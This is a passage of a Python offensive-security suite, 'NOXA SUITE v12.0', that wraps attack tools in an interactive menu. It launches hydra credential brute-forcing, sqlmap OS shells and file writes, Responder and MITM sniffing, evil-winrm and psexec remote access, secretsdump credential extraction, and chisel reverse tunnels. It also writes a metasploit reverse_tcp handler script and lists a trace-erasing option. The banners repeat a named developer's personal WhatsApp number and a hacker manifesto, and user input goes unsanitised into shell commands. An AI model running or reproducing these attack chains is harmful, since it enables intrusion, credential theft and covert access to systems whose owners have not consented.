        warn("Install: apt install gobuster")
        if ask("Install? (y/n)").lower() == 'y': install_tool("gobuster")
    if not check_tool("gobuster"): err("Tidak ada gobuster"); return
    url = ask("URL target"); wl = ask("Wordlist (default: /usr/share/wordlists/dirb/common.txt)") or "/usr/share/wordlists/dirb/common.txt"
    info(f"Bruteforcing {url}...")
    os.system(f"gobuster dir -u {url} -w {wl} -t 30 -q")

def wfuzz_scanner():
    voice("WFuzz...")
    if not check_tool("wfuzz"):
        warn("Install: pip install wfuzz")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install wfuzz")
    url = ask("URL (pakai FUZZ)"); wl = ask("Wordlist") or "/usr/share/wordlists/dirb/common.txt"
    os.system(f"wfuzz -c -z file,{wl} --hc 404 {url}")

def amass_enum():
    voice("Amass Subdomain Enum...")
    if not check_tool("amass"):
        warn("Install: go install -v github.com/owasp-amass/amass/v4/...@master")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install -v github.com/owasp-amass/amass/v4/...@master")
    if not check_tool("amass"): err("Tidak ada amass"); return
    domain = ask("Domain")
    info(f"Amass enum {domain}...")
    os.system(f"amass enum -d {domain} -o amass_{domain}.txt")

def masscan_ports():
    voice("Masscan Port Scan...")
    if not check_tool("masscan"):
        warn("Install: apt install masscan")
        if ask("Install? (y/n)").lower() == 'y': install_tool("masscan")
    if not check_tool("masscan"): err("Tidak ada masscan"); return
    target = ask("Target IP/range"); ports = ask("Ports (default: 1-65535)") or "1-65535"
    info(f"Masscan {target}...")
    os.system(f"sudo masscan {target} -p{ports} --rate=1000")

def searchsploit_local():
    voice("SearchSploit Local...")
    if not check_tool("searchsploit"):
        warn("Install: apt install exploitdb")
        if ask("Install? (y/n)").lower() == 'y': install_tool("exploitdb")
    if not check_tool("searchsploit"): err("Tidak ada searchsploit"); return
    kw = ask("Keyword")
    os.system(f"searchsploit {kw}")

def hydra_brute():
    voice("Hydra Bruteforce...")
    if not check_tool("hydra"):
        warn("Install: apt install hydra")
        if ask("Install? (y/n)").lower() == 'y': install_tool("hydra")
    if not check_tool("hydra"): err("Tidak ada hydra"); return
    print(f"\n{B}[1]{W} SSH {B}[2]{W} FTP {B}[3]{W} HTTP-POST {B}[4]{W} HTTP-GET {B}[5]{W} RDP {B}[6]{W} SMB {B}[7]{W} MySQL {B}[8]{W} Custom")
    m = ask("Protokol")
    target = ask("Target IP"); user = ask("User/File (-l/-L)"); wl = ask("Wordlist")
    if user.startswith('/'): uflag = f"-L {user}"
    else: uflag = f"-l {user}"
    protos = {'1':'ssh','2':'ftp','3':'http-post-form','4':'http-get','5':'rdp','6':'smb','7':'mysql'}
    proto = protos.get(m, ask("Custom protocol"))
    if m in ['3']:
        path = ask("Path (contoh: /login:user=^USER^&pass=^PASS^:F=invalid)")
        os.system(f"hydra -l {user} -P {wl} {target} {proto} '{path}'")
    else:
        os.system(f"hydra {uflag} -P {wl} {target} {proto}")

def sqlmap_api_wrapper():
    voice("SQLMap Advanced Wrapper...")
    if not check_tool("sqlmap"):
        warn("Install: apt install sqlmap")
        if ask("Install? (y/n)").lower() == 'y': install_tool("sqlmap")
    if not check_tool("sqlmap"): err("Tidak ada sqlmap"); return
    url = ask("URL target")
    print(f"\n{B}[1]{W} Enum all DBs {B}[2]{W} Dump specific {B}[3]{W} OS Shell {B}[4]{W} File Read {B}[5]{W} File Write {B}[6]{W} Tamper")
    m = ask("Mode")
    base = f"sqlmap -u '{url}' --batch --random-agent"
    cmds = {
        '1': f"{base} --dbs",
        '2': f"{base} -D {ask('DB')} -T {ask('Table')} --dump",
        '3': f"{base} --os-shell",
        '4': f"{base} --file-read={ask('File path')}",
        '5': f"{base} --file-write={ask('Local')} --file-dest={ask('Remote')}",
        '6': f"{base} --tamper={ask('Tamper scripts')}"
    }
    os.system(cmds.get(m, cmds['1']))

def wpscan_api():
    voice("WPScan API...")
    api_token = ask("WPScan API token (kosong = basic)")
    url = ask("WordPress URL")
    if check_tool("wpscan"):
        if api_token: os.system(f"wpscan --url {url} --api-token {api_token} --enumerate vp,vt,u --no-banner --random-user-agent")
        else: os.system(f"wpscan --url {url} --enumerate vp,vt,u --no-banner --random-user-agent")
    else:
        warn("Install: gem install wpscan")

def theHarvester_osint():
    voice("theHarvester OSINT...")
    if not check_tool("theHarvester"):
        warn("Install: apt install theharvester")
        if ask("Install? (y/n)").lower() == 'y': install_tool("theharvester")
    if not check_tool("theHarvester"): err("Tidak ada theHarvester"); return
    domain = ask("Domain"); source = ask("Source (default: all)") or "all"
    info(f"theHarvester {domain}...")
    os.system(f"theHarvester -d {domain} -b {source} -l 500")

def sherlock_username():
    voice("Sherlock Username Hunter...")
    if not check_tool("sherlock"):
        warn("Install: pip install sherlock-project")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install sherlock-project")
    if not check_tool("sherlock"): err("Tidak ada sherlock"); return
    username = ask("Username")
    os.system(f"sherlock {username} --timeout 10")

def holehe_email():
    voice("Holehe Email OSINT...")
    if not check_tool("holehe"):
        warn("Install: pip install holehe")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install holehe")
    if not check_tool("holehe"): err("Tidak ada holehe"); return
    email = ask("Email")
    os.system(f"holehe {email}")

def wafw00f_detect():
    voice("WAFW00F...")
    if not check_tool("wafw00f"):
        warn("Install: pip install wafw00f")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install wafw00f")
    if not check_tool("wafw00f"): err("Tidak ada wafw00f"); return
    url = ask("URL target")
    os.system(f"wafw00f {url}")

def whatweb_finger():
    voice("WhatWeb Fingerprint...")
    if not check_tool("whatweb"):
        warn("Install: apt install whatweb")
        if ask("Install? (y/n)").lower() == 'y': install_tool("whatweb")
    if not check_tool("whatweb"): err("Tidak ada whatweb"); return
    url = ask("URL target")
    os.system(f"whatweb -a 3 {url}")

def wpscan_vuln_db():
    voice("WPScan Vuln Database...")
    url = ask("WordPress URL")
    if check_tool("wpscan"):
        os.system(f"wpscan --url {url} --enumerate vp --no-banner --random-user-agent | grep -i 'vulnerab'")
    else: warn("Install wpscan")

def testssl_scanner():
    voice("testssl.sh Scanner...")
    if not check_tool("testssl.sh") and not check_tool("testssl"):
        warn("Install: git clone --depth 1 https://github.com/drwetter/testssl.sh.git")
    host = ask("Host:port (contoh: example.com:443)")
    cmd = "testssl.sh" if check_tool("testssl.sh") else "testssl"
    os.system(f"{cmd} {host}")

def sslyze_scanner():
    voice("SSLyze...")
    if not check_tool("sslyze"):
        warn("Install: pip install sslyze")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install sslyze")
    if not check_tool("sslyze"): err("Tidak ada sslyze"); return
    host = ask("Host:port") or "example.com:443"
    os.system(f"sslyze {host}")

def git_dumper():
    voice("Git Dumper...")
    if not check_tool("git-dumper"):
        warn("Install: pip install git-dumper")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install git-dumper")
    if not check_tool("git-dumper"): err("Tidak ada git-dumper"); return
    url = ask("URL (contoh: http://target/.git/)")
    out = ask("Output dir (default: ./gitdump)") or "./gitdump"
    os.system(f"git-dumper {url} {out}")

def gitleaks_scan():
    voice("Gitleaks Secret Scanner...")
    if not check_tool("gitleaks"):
        warn("Install: go install github.com/gitleaks/gitleaks/v8@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/gitleaks/gitleaks/v8@latest")
    if not check_tool("gitleaks"): err("Tidak ada gitleaks"); return
    repo = ask("GitHub repo URL / local path")
    os.system(f"gitleaks detect --source {repo} -v")

def trufflehog_scan():
    voice("TruffleHog Secret Scanner...")
    if not check_tool("trufflehog"):
        warn("Install: go install github.com/trufflesecurity/trufflehog/v3@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/trufflesecurity/trufflehog/v3@latest")
    if not check_tool("trufflehog"): err("Tidak ada trufflehog"); return
    repo = ask("Repo URL / filesystem path")
    os.system(f"trufflehog {repo} --only-verified")

def prowler_cloud():
    voice("Prowler Cloud Scanner...")
    if not check_tool("prowler"):
        warn("Install: pip install prowler")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install prowler")
    if not check_tool("prowler"): err("Tidak ada prowler"); return
    provider = ask("Provider (aws/azure/gcp)") or "aws"
    os.system(f"prowler {provider}")

def scoutsuite_cloud():
    voice("ScoutSuite Cloud...")
    if not check_tool("scout"):
        warn("Install: pip install scoutsuite")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install scoutsuite")
    if not check_tool("scout"): err("Tidak ada scoutsuite"); return
    provider = ask("Provider (aws/azure/gcp/aliyun)") or "aws"
    os.system(f"scout {provider}")

def bloodhound_ingest():
    voice("BloodHound Ingestor...")
    domain = ask("Domain (contoh: domain.local)")
    user = ask("User"); password = ask("Password"); dc = ask("DC IP")
    if check_tool("bloodhound-python"):
        os.system(f"bloodhound-python -d {domain} -u {user} -p {password} -dc {dc} -c All")
    else:
        warn("Install: pip install bloodhound")

def crackmapexec_ad():
    voice("CrackMapExec...")
    if not check_tool("crackmapexec") and not check_tool("cme"):
        warn("Install: pip install crackmapexec")
    cmd = "crackmapexec" if check_tool("crackmapexec") else "cme"
    target = ask("Target IP/range"); user = ask("User"); password = ask("Password")
    os.system(f"{cmd} smb {target} -u {user} -p {password}")

def responder_llmnr():
    voice("Responder LLMNR/NBT-NS...")
    if not check_tool("responder"):
        warn("Install: apt install responder / git clone https://github.com/lgandx/Responder")
    iface = ask("Interface (contoh: eth0)"); info(f"Running Responder on {iface}...")
    os.system(f"sudo responder -I {iface} -wv")

def ettercap_sniff():
    voice("Ettercap Sniffer...")
    if not check_tool("ettercap"):
        warn("Install: apt install ettercap-text-only")
        if ask("Install? (y/n)").lower() == 'y': install_tool("ettercap-text-only","ettercap-text-only")
    iface = ask("Interface"); info(f"Ettercap on {iface}...")
    os.system(f"sudo ettercap -T -q -i {iface}")

def bettercap_mitm():
    voice("Bettercap MITM...")
    if not check_tool("bettercap"):
        warn("Install: apt install bettercap")
        if ask("Install? (y/n)").lower() == 'y': install_tool("bettercap")
    iface = ask("Interface"); info(f"Bettercap on {iface}...")
    os.system(f"sudo bettercap -iface {iface}")

def mitmproxy_tool():
    voice("mitmproxy...")
    if not check_tool("mitmproxy"):
        warn("Install: apt install mitmproxy")
    info("mitmproxy: launch manual")
    os.system("mitmproxy --version 2>/dev/null")

def cme_smb_enum():
    voice("CME SMB Enum...")
    target = ask("Target IP/range")
    cmd = "crackmapexec" if check_tool("crackmapexec") else "cme"
    if not check_tool(cmd): warn("Install: pip install crackmapexec"); return
    os.system(f"{cmd} smb {target}")

def evil_winrm():
    voice("Evil-WinRM...")
    if not check_tool("evil-winrm"):
        warn("Install: gem install evil-winrm")
        if ask("Install? (y/n)").lower() == 'y': os.system("gem install evil-winrm")
    if not check_tool("evil-winrm"): err("Tidak ada evil-winrm"); return
    target = ask("Target IP"); user = ask("User"); password = ask("Password")
    os.system(f"evil-winrm -i {target} -u {user} -p {password}")

def impacket_psexec():
    voice("Impacket psexec...")
    if not check_tool("psexec.py"):
        warn("Install: pip install impacket")
        if ask("Install? (y/n)").lower() == 'y': os.system("pip install impacket")
    target = ask("Target IP"); user = ask("User"); password = ask("Password")
    domain = ask("Domain (optional)") or ""
    if domain: os.system(f"psexec.py {domain}/{user}:{password}@{target}")
    else: os.system(f"psexec.py {user}:{password}@{target}")

def impacket_secretsdump():
    voice("Impacket secretsdump...")
    if not check_tool("secretsdump.py"):
        warn("Install: pip install impacket"); return
    target = ask("Target IP"); user = ask("User"); password = ask("Password")
    os.system(f"secretsdump.py {user}:{password}@{target}")

def chisel_tunnel():
    voice("Chisel Tunnel...")
    if not check_tool("chisel"):
        warn("Install: go install github.com/jpillora/chisel@latest")
        if ask("Install? (y/n)").lower() == 'y': os.system("go install github.com/jpillora/chisel@latest")
    mode = ask("Mode (server/client)"); 
    if mode.lower() == 'server': os.system("chisel server -p 8080 --reverse")
    else:
        server = ask("Server (host:port)"); remote = ask("Remote (R:port:localhost:port)")
        os.system(f"chisel client {server} {remote}")

def ligolo_tunnel():
    voice("Ligolo-ng Tunnel...")
    warn("Ligolo-ng: install manual dari GitHub")
    info("https://github.com/nicocha30/ligolo-ng/releases")

def socks_proxy():
    voice("SOCKS Proxy...")
    port = ask("Port (default 1080)") or "1080"
    info(f"Setup SOCKS proxy on :{port}")
    if check_tool("ssh"):
        info(f"SSH SOCKS: ssh -D {port} user@host")
    if check_tool("chisel"):
        info(f"Chisel: chisel client <server> {port}:socks")

def metasploit_msfconsole_auto():
    voice("MSFConsole Auto...")
    if not check_tool("msfconsole"): err("Install metasploit"); return
    rc_script = ask("RC script path (or 'new')")
    if rc_script == 'new':
        rc_script = f"auto_{int(time.time())}.rc"
        with open(rc_script,'w') as f:
            f.write("use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nexploit -j\n")
        ok(f"Created {rc_script}")
    os.system(f"msfconsole -r {rc_script}")

def exploit_auto_builder():
    voice("Exploit Auto Builder...")
    info("Membangun exploit chain...")
    cve = ask("CVE ID")
    try:
        r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}", timeout=15)
        if r.status_code == 200:
            vulns = r.json().get('vulnerabilities',[])
            if vulns:
                data = vulns[0].get('cve',{})
                vuln(f"{cve}")
                info(f"Description: {data.get('descriptions',[{}])[0].get('value','N/A')[:300]}")
                for ref in data.get('references',[])[:10]: info(f"  {ref.get('url','')}")
    except: pass

def cve_exploit_chain():
    voice("CVE Exploit Chain...")
    cves_input = ask("CVE list (pisah koma)")
    cves = [c.strip() for c in cves_input.split(',') if c.strip()]
    for cve in cves:
        info(f"Chain: {cve}")
        try:
            r = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}", timeout=15)
            if r.status_code == 200:
                vulns = r.json().get('vulnerabilities',[])
                if vulns:
                    data = vulns[0].get('cve',{})
                    metrics = data.get('metrics',{})
                    score = "N/A"
                    if 'cvssMetricV31' in metrics: score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                    vuln(f"  CVSS: {score}")
                    for ref in data.get('references',[])[:3]: info(f"    {ref.get('url','')}")
        except: pass

def full_scan():
    voice("FULL SCAN EXTENDED - Real-Time!")
    url = norm(ask("URL target")); RESULTS["target"] = url
    host = urlparse(url).netloc.split(':')[0]
    warn(f"Target: {url}")
    if ask("Lanjut? (y/n)").lower() != 'y': warn("Dibatalkan"); return
    tasks = [
        ("XSS", lambda: xss_scanner(url, silent=True)),
        ("SQLi", lambda: sql_scanner(url, silent=True)),
        ("LFI", lambda: lfi_scanner(url, silent=True)),
        ("RFI", lambda: rfi_scanner(url, silent=True)),
        ("SSRF", lambda: ssrf_scanner(url, silent=True)),
        ("Redirect", lambda: open_redirect(url, silent=True)),
        ("CORS", lambda: cors_check(url, silent=True)),
        ("CSRF", lambda: csrf_check(url, silent=True)),
        ("Headers", lambda: header_check(url, silent=True)),
        ("Admin", lambda: admin_finder(url, silent=True)),
        ("Subdomain", lambda: subdomain_finder(host, silent=True)),
        ("Port", lambda: port_scanner(host, silent=True)),
        ("Whois", lambda: whois_lookup(host, silent=True)),
        ("DNS", lambda: dns_lookup(host, silent=True)),
        ("GeoIP", lambda: geoip(host, silent=True)),
        ("SSL", lambda: ssl_info(host, silent=True)),
        ("Tech", lambda: tech_detect(url, silent=True)),
        ("Cookies", lambda: cookie_analyzer(url, silent=True)),
        ("Wayback", lambda: wayback(url, silent=True)),
        ("Rev-IP", lambda: reverse_ip(host, silent=True)),
        ("Dorks", lambda: dork_gen(host, silent=True)),
        ("Data", lambda: data_extractor(url, silent=True)),
        ("WAF", lambda: waf_detector(url, silent=True)),
        ("DBMS", lambda: dbms_fingerprint(url, silent=True)),
        ("Time", lambda: time_based_extract(url, silent=True)),
        ("Blind", lambda: blind_boolean_extract(url, silent=True)),
        ("UNION", lambda: union_based_extract(url, silent=True)),
        ("Error", lambda: error_based_extract(url, silent=True)),
        ("Hash", lambda: hash_dumper(url, silent=True)),
        ("MongoDB", lambda: mongodb_scan(host, silent=True)),
        ("Redis", lambda: redis_scan(host, silent=True)),
        ("ES", lambda: elasticsearch_scan(host, silent=True)),
        ("API-Keys", lambda: api_key_hunter(url, silent=True)),
        ("GraphQL", lambda: graphql_scan(urljoin(url,'/graphql'), silent=True)),
        ("Env", lambda: env_leak_scan(url, silent=True)),
        ("S3", lambda: s3_scanner(host, silent=True)),
        ("SrcMap", lambda: sourcemap_hunter(url, silent=True)),
        ("PostExp", lambda: post_exploit(url, silent=True)),
        ("XXE", lambda: xxe_tester(url, silent=True)),
        ("SSTI", lambda: ssti_tester(url, silent=True)),
        ("K8s", lambda: k8s_scanner(host, silent=True)),
        ("Docker", lambda: docker_scanner(host, silent=True)),
        ("etcd", lambda: etcd_scanner(host, silent=True)),
        ("Consul", lambda: consul_scanner(host, silent=True)),
        ("Vault", lambda: vault_scanner(host, silent=True)),
        ("Takeover", lambda: subdomain_takeover(host, silent=True)),
        ("GitExp", lambda: git_exposure_auto(url)),
        ("Backup", lambda: backup_finder_auto(url)),
        ("JS-EP", lambda: js_extractor_auto(url)),
        ("API-Disc", lambda: api_discovery_auto(url)),
        ("robots", lambda: robots_parser_auto(url)),
        ("sitemap", lambda: sitemap_parser_auto(url)),
        ("Spring", lambda: spring_boot_scanner()),
        ("Jenkins", lambda: jenkins_scanner()),
        ("Tomcat", lambda: tomcat_scanner()),
    ]
    if check_tool("nuclei"): tasks.append(("Nuclei", lambda: nuclei_auto(url)))
    else: warn("Skip Nuclei (belum install)")
    if check_tool("dalfox"): tasks.append(("Dalfox", lambda: dalfox_auto(url)))
    if check_tool("nikto"): tasks.append(("Nikto", lambda: nikto_auto(url)))
    total = len(tasks)
    ok(f"Total {total} fitur akan dijalankan...")
    for i,(name,func) in enumerate(tasks,1):
        print(f"\n{C}{'═'*55}{W}")
        print(f"{C}  [{i}/{total}] {name}{W}", flush=True)
        print(f"{C}{'═'*55}{W}", flush=True)
        try: func()
        except Exception as e: err(f"{name}: {e}")
    save_report(); show_results()
    ok(f"FULL SCAN EXTENDED selesai! ({total} fitur)")
    info("Save hasil: menu 57/58/59/60")

def nuclei_auto(target): info("Running Nuclei..."); os.system(f"nuclei -u {target} -severity critical,high -silent")
def dalfox_auto(url): info("Running Dalfox..."); os.system(f"dalfox url {url} --silence --no-color")
def nikto_auto(url): info("Running Nikto..."); os.system(f"nikto -h {url} -nointeractive | head -50")

def info_developer():
    voice("Info Developer...")
    print(f"""
{C}═══════════════════════════════════════════════════════════{W}
{G}         🔥 INFO DEVELOPER - NOXA SUITE v12.0 🔥{W}
{C}═══════════════════════════════════════════════════════════{W}

{Y}╭─ IDENTITAS ─────────────────────────────────────╮{W}
{G}  Nama     : Arif Hidayatullah{W}
{G}  Alias    : Mr. RanzzSky, NOXA_TERMINAL, Ghost{W}
{G}  WhatsApp : +62881012765716{W}
{G}  Lokasi   : Tangerang - Regency{W}
{Y}╰─────────────────────────────────────────────────╯{W}

{Y}╭─ VISI ──────────────────────────────────────────╮{W}
{G}  "Memperluas karya anak bangsat"{W}
{Y}╰─────────────────────────────────────────────────╯{W}

{Y}╭─ MISI ──────────────────────────────────────────╮{W}
{G}  1. Menjadi anomali di balik bayangan{W}
{G}  2. Tools offensive untuk authorized pentest{W}
{G}  3. Melawan tikus-tikus kantor yang zalim{W}
{Y}╰─────────────────────────────────────────────────╯{W}

{Y}╭─ MANIFESTO ─────────────────────────────────────╮{W}
{R}  "We Are Anonymous from Mr.RanzzSky legion"{W}
{R}  "no porensif no legit"{W}
{R}  "Hidup dalam bayangan, bergerak sesuai tindakan."{W}
{Y}╰─────────────────────────────────────────────────╯{W}

{C}═══════════════════════════════════════════════════════════{W}
{M}     owner : Noxa Terminal In from RanzzSky AI{W}
{M}     WhatsApp: +62881012765716{W}
{C}═══════════════════════════════════════════════════════════{W}
""")
    input(f"\n{Y}[!] Enter...{W}")

def export_zip():
    voice("Bikin ZIP...")
    name = ask("Nama ZIP (default: noxa_report)") or "noxa_report"
    if not name.endswith('.zip'): name += '.zip'
    save_report()
    files = [f for f in ['noxa_report.json','extracted_data.json','noxa_report.pdf','noxa_report.csv','noxa_report.txt','bugcrowd_report.json'] if os.path.exists(f)]
    if not files: files = ['noxa_report.json']
    with zipfile.ZipFile(name,'w',zipfile.ZIP_DEFLATED) as z:
        for f in files: z.write(f); info(f)
    ok(f"ZIP: {name} ({os.path.getsize(name)} bytes)")

def export_csv():
    voice("Export CSV...")
    name = ask("Nama CSV (default: noxa_report)") or "noxa_report"
    if not name.endswith('.csv'): name += '.csv'
    with open(name,'w',newline='',encoding='utf-8') as f:
        w = csv.writer(f); w.writerow(["Category","Detail"])
        for k,v in RESULTS.items():
            if isinstance(v, list):
                for item in v[:50]: w.writerow([k, str(item)[:200]])
    ok(f"CSV: {name}")

def export_txt():
    voice("Export TXT...")
    name = ask("Nama TXT (default: noxa_report)") or "noxa_report"
    if not name.endswith('.txt'): name += '.txt'
    with open(name,'w',encoding='utf-8') as f:
        f.write("="*60+"\nNOXA PENTEST REPORT v12.0\n"+"="*60+"\n")
        f.write(f"Target: {RESULTS.get('target','N/A')}\n")
        f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Owner: Arif Hidayatullah | WhatsApp: +62881012765716\n\n")
        for k,v in RESULTS.items():
            if isinstance(v, list) and v:
                f.write(f"\n[{k.upper()}] ({len(v)})\n")
                for item in v[:30]: f.write(f"  - {str(item)[:200]}\n")
        f.write("\n"+"="*60+"\nWe Are Anonymous from Mr.RanzzSky legion\nno porensif no legit\n")
    ok(f"TXT: {name}")

def export_pdf():
    voice("Export PDF...")
    if not HAS_PDF:
        warn("Install: pip install fpdf2"); os.system("pip install fpdf2 2>/dev/null")
        try: from fpdf import FPDF
        except: err("Gagal"); return
    from fpdf import FPDF
    name = ask("Nama PDF (default: noxa_report)") or "noxa_report"
    if not name.endswith('.pdf'): name += '.pdf'
    pdf = FPDF(); pdf.add_page()
    pdf.set_font("Helvetica","B",18); pdf.set_text_color(180,0,0)
    pdf.cell(0,12,"NOXA PENTEST REPORT v12.0",ln=True,align='C')
    pdf.set_font("Helvetica","I",10); pdf.set_text_color(100,100,100)
    pdf.cell(0,6,"\"We Are Anonymous from Mr.RanzzSky legion - no porensif no legit\"",ln=True,align='C')
    pdf.ln(3); pdf.set_text_color(0,0,0); pdf.set_font("Helvetica","",10)
    pdf.cell(0,6,"Owner: Arif Hidayatullah | WhatsApp: +62881012765716",ln=True)
    pdf.cell(0,6,f"Target: {RESULTS.get('target','N/A')}",ln=True)
    pdf.cell(0,6,f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",ln=True)
    pdf.ln(5)
    for title_key in ["xss","sql","lfi","rfi","ssrf","admin_panels","subdomains","open_ports","db_dump",
        "api_keys","leaked_env","s3_buckets","kubernetes","docker","cve","exploits","takeover",
        "js_endpoints","params","email_osint","phone_osint","username_hits"]:
        items = RESULTS.get(title_key, [])
        if not items: continue
        pdf.set_font("Helvetica","B",12); pdf.set_text_color(0,0,150)
        pdf.cell(0,8,title_key.upper(),ln=True); pdf.set_text_color(0,0,0); pdf.set_font("Helvetica","",9)
        for it in items[:40]:
            try: pdf.multi_cell(0,4,f"- {str(it)[:150]}")
            except: pass
        pdf.ln(2)
    pdf.ln(5); pdf.set_font("Helvetica","B",11); pdf.set_text_color(180,0,0)
    pdf.cell(0,8,"--- END OF REPORT ---",ln=True,align='C')
    try:
        pdf.output(name); ok(f"PDF: {name} ({os.path.getsize(name)} bytes)")
    except Exception as e: err(f"Error: {e}")

def show_results():
    voice("Ringkasan...")
    info(f"Target: {RESULTS.get('target','N/A')}")
    cats = [("Web",["xss","sql","lfi","rfi","ssrf","open_redirect","cors","csrf"]),
        ("Admin",["admin_panels","subdomains","open_ports"]),
        ("DB",["db_dump","blind_data","injection_points"]),
        ("NoSQL",["mongodb","redis","elasticsearch","api_keys","s3_buckets","leaked_env"]),
        ("Cloud",["kubernetes","docker","aws_metadata","gcp_metadata","etcd","consul","vault"]),
        ("OSINT",["cve","exploits","takeover","email_osint","phone_osint","username_hits","hash_id"]),
        ("Arsenal",["brute_hits","payloads","utils","nuclei"]),
        ("Bugcrowd",["js_endpoints","params"])]
    for cat, keys in cats:
        total = sum(len(RESULTS.get(k,[])) for k in keys if isinstance(RESULTS.get(k),list))
        info(f"[{cat}] {total}")

def menu():
    print(f"""{G}
╔══════════════════════════════════════════════════════════════╗
║        NOXA SUITE v12.0 - PHANTOM EDITION                    ║
║        Arif Hidayatullah | +62881012765716                   ║
╚══════════════════════════════════════════════════════════════╝{W}

{R}┌───[ v12 NEW TOOLS ]───────────────────────────────────────┐
{C}│  168.Dalfox    169.Commix   170.Nikto   171.Gobuster     │
{C}│  172.WFuzz     173.Amass    174.Masscan 175.SearchSploit │
{C}│  176.Hydra     177.SQLMap+  178.WPScan+ 179.theHarvester │
{C}│  180.Sherlock  181.Holehe   182.WAFW00F 183.WhatWeb      │
{C}│  184.WPScan-DB 185.testssl  186.SSLyze  187.Git-Dumper   │
{C}│  188.Gitleaks  189.TruffleHog 190.Prowler 191.ScoutSuite │
{C}│  192.BloodHound 193.CrackMapExec 194.Responder           │
{C}│  195.Ettercap  196.Bettercap 197.MITM tools              │
{R}└───────────────────────────────────────────────────────────┘{W}

{R}┌───[ BUGCROWD ESSENTIAL ]──────────────────────────────────┐
{W}│  146.Subfinder 147.HTTPX 148.Katana 149.FFUF 150.GAU       │
│  151.JS-EP 152.ParamSpd 153.SubTakeov 154.Screenshot       │
│  155.VulnCorr 156.BC-Report 157.ScopeChk 158.SafeScan      │
│  159.CVEPoC 160.VDP-Find 161.Dupe 162.ProgramPick          │
│  163.CVEMon 164.APIKeyVal 165.SubPerm 166.APIFuzz 167.VDPScan│
{R}└───────────────────────────────────────────────────────────┘{W}

{C}┌───[ WEB SCANNERS ]────────────────────────────────────────┐
{W}│  1.XSS 2.SQLi 3.LFI 4.RFI 5.SSRF 6.Redirect 7.CORS 8.CSRF │
│  9.Header 10.Admin 11.Subdo 12.Port 13.Whois 14.DNS        │
│  15.GeoIP 16.SSL 17.Tech 18.Cookie 19.Wayback 20.RevIP     │
│  21.Dorks 22.Data                                           │
{C}└───────────────────────────────────────────────────────────┘{W}

{Y}┌───[ DB ASSAULT ]──────────────────────────────────────────┐
{W}│  23.WAF 24.DBMS 25.Error 26.Blind 27.Time 28.UNION         │
│  29.POST 30.Cookie 31.H-SQLi 32.HashDump                   │
{Y}└───────────────────────────────────────────────────────────┘{W}

{M}┌───[ NOSQL & CLOUD ]───────────────────────────────────────┐
{W}│  33-47 NoSQL/Mongo/Redis/ES/JWT/GraphQL/XXE/SSTI/Log4Shell │
│  48-55 K8s/Docker/AWS/GCP/Azure/etcd/Consul/Vault          │
{M}└───────────────────────────────────────────────────────────┘{W}

{Y}┌───[ NETWORK/WIFI ]────────────────────────────────────────┐
{W}│  62.Nmap 63.TShark 64.Aircrack 65.Pedora 66.GhostTracker  │
│  68.HAPUS-JEJAK                                            │
{Y}└───────────────────────────────────────────────────────────┘{W}

{R}┌───[ v6-v9 OSINT/ARSENAL ]─────────────────────────────────┐
{W}│  69-80 CVE/MSF/EDB/HashCrack/OSINT/WiFi/Wordlist/Knock    │
│  81-100 SSH/FTP/WPScan/SMB/SNMP/SSL/Shodan/VT/Pastebin    │
│  101-120 Nuclei/Exploit/HTTP/CORS/JWT/GQL/Rate/Smuggle    │
│  121-145 Scope/Hunter/Email/Censys/URLScan/SecTrails/etc  │
{R}└───────────────────────────────────────────────────────────┘{W}

{G}┌───[ EXPORT & INFO ]───────────────────────────────────────┐
{W}│  56.Show 57.ZIP 58.PDF 59.CSV 60.TXT 61.Save 67.InfoDev   │
{G}└───────────────────────────────────────────────────────────┘{W}

{R}╔══════════════════════════════════════════════════════════════╗
║  [88] FULL SCAN EXTENDED (Auto ~60 fitur)                    ║
║  [0]  EXIT                                                    ║
╚══════════════════════════════════════════════════════════════╝{W}
""", flush=True)

def main():
    T = {
        # v2-v5 core
        '1':xss_scanner,'2':sql_scanner,'3':lfi_scanner,'4':rfi_scanner,
        '5':ssrf_scanner,'6':open_redirect,'7':cors_check,'8':csrf_check,
        '9':header_check,'10':admin_finder,'11':subdomain_finder,'12':port_scanner,
        '13':whois_lookup,'14':dns_lookup,'15':geoip,'16':ssl_info,
        '17':tech_detect,'18':cookie_analyzer,'19':wayback,'20':reverse_ip,
        '21':dork_gen,'22':data_extractor,
        '23':waf_detector,'24':dbms_fingerprint,'25':error_based_extract,
        '26':blind_boolean_extract,'27':time_based_extract,'28':union_based_extract,
        '29':post_sqli,'30':cookie_sqli,'31':header_sqli,'32':hash_dumper,
        '33':mongodb_scan,'34':mongodb_injection,'35':redis_scan,'36':elasticsearch_scan,
        '37':cassandra_scan,'38':api_key_hunter,'39':jwt_analyzer,'40':graphql_scan,
        '41':env_leak_scan,'42':s3_scanner,'43':sourcemap_hunter,'44':post_exploit,
        '45':xxe_tester,'46':ssti_tester,'47':log4shell_scan,
        '48':k8s_scanner,'49':docker_scanner,'50':aws_metadata,'51':gcp_metadata,
        '52':azure_metadata,'53':etcd_scanner,'54':consul_scanner,'55':vault_scanner,
        '56':show_results,'57':export_zip,'58':export_pdf,'59':export_csv,
        '60':export_txt,'61':save_report,
        '62':nmap_tool,'63':wireshark_tool,'64':aircrack_tool,
        '65':pedora_tool,'66':ghost_tracker,'67':info_developer,'68':hapus_jejak,
        # v6
        '69':cve_lookup,'70':metasploit_wrapper,'71':exploitdb_search,
        '72':hash_identifier,'73':hash_cracker_wordlist,'74':subdomain_takeover,
        '75':email_osint,'76':phone_osint,'77':username_hunter,
